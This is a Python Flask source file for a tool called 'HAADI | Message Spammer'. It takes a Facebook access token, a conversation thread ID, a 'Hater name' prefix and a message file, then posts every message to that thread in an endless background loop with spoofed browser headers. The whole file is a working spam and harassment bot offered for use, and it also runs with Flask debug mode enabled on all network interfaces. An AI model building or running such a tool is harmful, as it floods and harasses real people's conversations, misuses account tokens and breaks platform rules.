‎from flask import Flask, request, render_template_string
‎import threading
‎import requests
‎import time
‎
‎app = Flask(__name__)
‎app.debug = True
‎
‎# HTML Frontend Template
‎html_code = '''
‎<!DOCTYPE html>
‎<html lang="en">
‎<head>
‎  <meta charset="UTF-8" />
‎  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
‎  <title>HAADI TOOL | Convo Loader</title>
‎  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
‎  <style>
‎    body {
‎      background: linear-gradient(to right, #1f4037, #99f2c8);
‎      font-family: 'Segoe UI', sans-serif;
‎      color: white;
‎    }
‎    .box {
‎      max-width: 600px;
‎      margin: 80px auto;
‎      background: rgba(0, 0, 0, 0.6);
‎      border-radius: 15px;
‎      padding: 30px;
‎      box-shadow: 0 0 20px rgba(255,255,255,0.2);
‎    }
‎    .box h2 {
‎      text-align: center;
‎      margin-bottom: 30px;
‎      font-weight: bold;
‎    }
‎    .btn-submit {
‎      background: #00ffae;
‎      border: none;
‎      color: black;
‎      font-weight: bold;
‎    }
‎    .btn-submit:hover {
‎      background: #00ffaa;
‎      color: white;
‎    }
‎    footer {
‎      text-align: center;
‎      margin-top: 30px;
‎      font-size: 14px;
‎      color: #ccc;
‎    }
‎  </style>
‎</head>
‎<body>
‎  <div class="box">
‎    <h2>HAADI | Message Spammer</h2>
‎    <form action="/" method="post" enctype="multipart/form-data">
‎      <div class="mb-3">
‎        <label>Access Token:</label>
‎        <input type="text" class="form-control" name="accessToken" required />
‎      </div>
‎      <div class="mb-3">
‎        <label>Thread ID (Convo ID):</label>
‎        <input type="text" class="form-control" name="threadId" required />
‎      </div>
‎      <div class="mb-3">
‎        <label>Prefix Name (e.g., Hater name):</label>
‎        <input type="text" class="form-control" name="kidx" required />
‎      </div>
‎      <div class="mb-3">
‎        <label>Select Message List (.txt):</label>
‎        <input type="file" class="form-control" name="txtFile" accept=".txt" required />
‎      </div>
‎      <div class="mb-3">
‎        <label>Message Delay (in seconds):</label>
‎        <input type="number" class="form-control" name="time" min="1" required />
‎      </div>
‎      <button type="submit" class="btn btn-submit w-100">Start Bot</button>
‎    </form>
‎  </div>
‎  <footer>
‎    Developed by <strong>Stuner</strong> | 2024 All Rights Reserved
‎  </footer>
‎</body>
‎</html>
‎'''
‎
‎# Background message loop
‎def message_sender(access_token, thread_id, mn, time_interval, messages):
‎    headers = {
‎        'Connection': 'keep-alive',
‎        'Cache-Control': 'max-age=0',
‎        'Upgrade-Insecure-Requests': '1',
‎        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
‎        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
‎        'Accept-Encoding': 'gzip, deflate',
‎        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
‎        'referer': 'www.google.com'
‎    }
‎
‎    while True:
‎        for msg in messages:
‎            try:
‎                message = f"{mn} {msg}"
‎                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
‎                parameters = {'access_token': access_token, 'message': message}
‎                r = requests.post(api_url, data=parameters, headers=headers)
‎
‎                status = "Success" if r.status_code == 200 else f"Fail {r.status_code}"
‎                print(f"[{status}] {message}")
‎                time.sleep(time_interval)
‎            except Exception as e:
‎                print(f"Error: {e}")
‎                time.sleep(30)
‎
‎@app.route('/', methods=['GET', 'POST'])
‎def send_message():
‎    if request.method == 'POST':
‎        access_token = request.form.get('accessToken')
‎        thread_id = request.form.get('threadId')
‎        mn = request.form.get('kidx')
‎        time_interval = int(request.form.get('time'))
‎        messages = request.files['txtFile'].read().decode().splitlines()
‎
‎        # Start background thread
‎        thread = threading.Thread(target=message_sender, args=(access_token, thread_id, mn, time_interval, messages))
‎        thread.daemon = True
‎        thread.start()
‎
‎        return '<h2>Script started in background. Keep this server running!</h2>'
‎
‎    return render_template_string(html_code)
‎
‎if __name__ == '__main__':
‎    app.run(host='0.0.0.0', port=21551)
